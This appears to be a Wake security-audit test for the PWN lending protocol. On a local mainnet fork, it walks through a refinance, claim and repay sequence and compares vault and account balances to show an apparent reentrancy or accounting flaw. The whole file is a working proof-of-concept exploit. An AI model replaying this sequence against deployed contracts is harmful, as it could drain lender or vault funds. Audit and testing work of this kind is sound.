from dataclasses import dataclass
from wake.testing import *

from pytypes.core.src.config.PWNConfig import PWNConfig
from pytypes.core.src.loan.token.PWNLOAN import PWNLOAN
from pytypes.core.src.hub.PWNHub import PWNHub
from pytypes.core.src.utilizedcredit.PWNUtilizedCredit import PWNUtilizedCredit
from pytypes.core.src.nonce.PWNRevokedNonce import PWNRevokedNonce

from pytypes.core.lib.MultiToken.src.MultiToken import MultiToken
from pytypes.core.lib.MultiToken.src.MultiTokenCategoryRegistry import (
    MultiTokenCategoryRegistry,
)
from pytypes.core.src.loan.terms.simple.loan.PWNSimpleLoan import PWNSimpleLoan
from pytypes.core.src.utilizedcredit.PWNUtilizedCredit import PWNUtilizedCredit

from pytypes.core.src.loan.terms.simple.proposal.PWNSimpleLoanSimpleProposal import (
    PWNSimpleLoanSimpleProposal,
)
from pytypes.wake.interfaces.IERC20 import IERC20
from pytypes.wake.ERC1967Factory import ERC1967Factory

ACTIVE_LOAN_TAG = keccak256(b"PWN_ACTIVE_LOAN")
LOAN_PROPOSAL_TAG = keccak256(b"PWN_LOAN_PROPOSAL")
NONCE_MANAGER_TAG = keccak256(b"NONCE_MANAGER")

USDT = IERC20("0xdac17f958d2ee523a2206206994597c13d831ec7")
WETH = IERC20("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2")

@dataclass
class Permit:
    owner: Address
    spender: Address
    value: uint256
    nonce: uint256
    deadline: uint256


@chain.connect(fork="http://localhost:8545")
@on_revert(lambda e: print(e.tx.value if e.tx else "no tx"))
def test_reentrancy():
    hub = PWNHub.deploy()
    utilized_credit = PWNUtilizedCredit.deploy(hub, LOAN_PROPOSAL_TAG)
    revoked_nonce = PWNRevokedNonce.deploy(hub, NONCE_MANAGER_TAG)
    multi_token_registry = MultiTokenCategoryRegistry.deploy()

    proxy_factory = ERC1967Factory.deploy()

    config = PWNConfig.deploy()
    config = PWNConfig(
        proxy_factory.deploy_(config, chain.accounts[0]).return_value
    )

    config.initialize(chain.accounts[0], 100, chain.accounts[0])

    loan_token = PWNLOAN.deploy(hub)
    vault = PWNSimpleLoan.deploy(
        hub,
        loan_token,
        config,
        revoked_nonce,
        multi_token_registry,
    )

    simple_proposal = PWNSimpleLoanSimpleProposal.deploy(
        hub, revoked_nonce, config, utilized_credit
    )

    hub.setTag(simple_proposal, LOAN_PROPOSAL_TAG, True)
    hub.setTag(vault, NONCE_MANAGER_TAG, True)
    hub.setTag(vault, ACTIVE_LOAN_TAG, True)


    old_lender = chain.accounts[1]
    borrower = chain.accounts[2]
    lender = chain.accounts[3]

    mint_erc20(WETH, vault, 10000)


    mint_erc20(WETH, old_lender, 2000)
    WETH.approve(vault, 2000, from_=old_lender)

    mint_erc20(WETH, lender, 1000)

    mint_erc20(WETH, borrower, 1000)

    # Collateral
    mint_erc20(USDT, borrower, 1)
    USDT.approve(vault, 1, from_=borrower)



    print("----------------BEFORE----------------")
    print("WETH balances:")
    print("  vault:", WETH.balanceOf(vault))
    print("-----")
    print("  borrower:", WETH.balanceOf(borrower))
    print("  original lender:", WETH.balanceOf(old_lender))
    print("  new lender:", WETH.balanceOf(lender))
    print("")
    print("USDT balances:")
    print("  vault:", USDT.balanceOf(vault))
    print("-----")
    print("  borrower:", USDT.balanceOf(borrower))
    print("  original lender:", USDT.balanceOf(old_lender))
    print("  new lender:", USDT.balanceOf(lender))


    proposal = PWNSimpleLoanSimpleProposal.Proposal(
        collateralCategory=MultiToken.Category.ERC20,
        collateralAddress=USDT.address,
        collateralId=0,
        collateralAmount=1,
        checkCollateralStateFingerprint=False,
        collateralStateFingerprint=bytes32(0),
        creditAddress=WETH.address,
        creditAmount=1000,
        availableCreditLimit=uint256.max,
        utilizedCreditId=bytes32(0),
        fixedInterestAmount=0,
        accruingInterestAPR=0,
        durationOrDate=1000,
        expiration=chain.blocks["pending"].timestamp + 1000,
        allowedAcceptor=Address.ZERO,
        proposer=borrower.address,
        proposerSpecHash=keccak256(abi.encode(PWNSimpleLoan.LenderSpec(borrower.address))),
        isOffer=False,
        refinancingLoanId=0,
        nonceSpace=0,
        nonce=0,
        loanContract=vault.address,
    )
    signature = borrower.sign_structured(
        proposal,
        Eip712Domain(
            name="PWNSimpleLoanSimpleProposal",
            version="1.3",
            chainId=chain.chain_id,
            verifyingContract=simple_proposal,
        ),
    )

    tx = vault.createLOAN(
        proposalSpec=PWNSimpleLoan.ProposalSpec(
            proposalContract=simple_proposal.address,
            proposalData=abi.encode(proposal),
            proposalInclusionProof=[],
            signature=signature,
        ),
        lenderSpec=PWNSimpleLoan.LenderSpec(
            sourceOfFunds=old_lender.address,
        ),
        callerSpec=PWNSimpleLoan.CallerSpec(
            refinancingLoanId=0,
            revokeNonce=False,
            nonce=0,
            permitData=b"",
        ),
        extra=b"",
        from_=old_lender,
    )
    old_loan_id = tx.return_value


    loan_token.transferFrom(old_lender, lender, old_loan_id, from_=old_lender)

    refinance_proposal = PWNSimpleLoanSimpleProposal.Proposal(
        collateralCategory=MultiToken.Category.ERC20,  # collateral must remain the same
        collateralAddress=USDT.address,
        collateralId=0,
        collateralAmount=1,
        checkCollateralStateFingerprint=False,
        collateralStateFingerprint=bytes32(0),
        creditAddress=WETH.address,
        creditAmount=1000,
        availableCreditLimit=uint256.max,
        utilizedCreditId=bytes32(0),
        fixedInterestAmount=0,
        accruingInterestAPR=0,
        durationOrDate=1000,
        expiration=chain.blocks["pending"].timestamp + 1000,
        allowedAcceptor=Address.ZERO,
        proposer=borrower.address,
        proposerSpecHash=keccak256(abi.encode(PWNSimpleLoan.LenderSpec(borrower.address))),
        isOffer=False,
        refinancingLoanId=old_loan_id,
        nonceSpace=0,
        nonce=0,
        loanContract=vault.address,
    )


    signature = borrower.sign_structured(
        refinance_proposal,
        Eip712Domain(
            name="PWNSimpleLoanSimpleProposal",
            version="1.3",
            chainId=chain.chain_id,
            verifyingContract=simple_proposal,
        ),
    )

    tx = None

    WETH.approve(vault, 1000, from_=borrower) # shortage
    WETH.approve(vault, 1000, from_=lender) # fee

    tx = vault.createLOAN(
        PWNSimpleLoan.ProposalSpec(
            proposalContract=simple_proposal.address,
            proposalData=abi.encode(refinance_proposal),
            proposalInclusionProof=[],
            signature=signature,
        ),
        PWNSimpleLoan.LenderSpec(
            sourceOfFunds=lender.address,
        ),
        PWNSimpleLoan.CallerSpec(
            refinancingLoanId=refinance_proposal.refinancingLoanId,
            revokeNonce=False,
            nonce=0,
            permitData=b"",
        ),
        b"",
        from_=lender,
    )

    # print(tx.call_trace)

    new_loan_id = tx.return_value
    assert not any(isinstance(event, PWNSimpleLoan.LOANClaimed) for event in tx.events)


    USDT.approve(vault, 1, from_=borrower)

    # print("lender balance before claim:", WETH.balanceOf(lender))

    vault.claimLOAN(old_loan_id, from_=lender)
    # print("lender balance after claim:", WETH.balanceOf(lender))


    WETH.approve(vault, 2000, from_=borrower)


    tx = vault.repayLOAN(new_loan_id, b"", from_=borrower)
    # print(tx.call_trace)


    print("----------------AFTER----------------")
    print("WETH balances:")
    print("  vault:", WETH.balanceOf(vault))
    print("-----")
    print("  borrower:", WETH.balanceOf(borrower))
    print("  original lender:", WETH.balanceOf(old_lender))
    print("  new lender:", WETH.balanceOf(lender))
    print("")
    print("USDT balances:")
    print("  vault:", USDT.balanceOf(vault))
    print("-----")
    print("  borrower:", USDT.balanceOf(borrower))
    print("  original lender:", USDT.balanceOf(old_lender))
    print("  new lender:", USDT.balanceOf(lender))
